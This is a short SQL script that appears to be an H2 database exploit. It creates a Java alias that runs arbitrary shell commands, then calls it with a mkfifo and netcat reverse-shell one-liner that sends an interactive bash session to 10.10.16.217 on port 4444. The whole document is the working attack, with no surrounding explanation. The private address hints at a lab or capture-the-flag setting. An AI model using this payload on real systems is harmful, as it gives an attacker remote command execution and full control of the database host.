DROP ALIAS IF EXISTS SHELLEXEC;
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    Runtime.getRuntime().exec(command);
    return "ok";
}
$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.217 4444 >/tmp/f');